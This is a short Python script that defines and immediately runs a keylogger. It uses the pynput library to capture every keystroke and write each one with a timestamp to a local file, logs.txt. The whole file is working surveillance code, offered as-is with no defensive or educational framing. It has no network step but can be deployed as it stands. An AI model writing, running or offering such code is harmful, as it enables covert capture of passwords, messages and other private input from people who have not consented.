import logging
from pynput.keyboard import Listener


def keylogger_py():
    log_destination = ""
    logging.basicConfig(filename=(log_destination + "logs.txt"),
                        level=logging.DEBUG,
                        format='%(asctime)s : %(message)s')

    def keypress(key):
        logging.info(str(key))

    with Listener(on_press=keypress) as listener:
        listener.join()


keylogger_py()
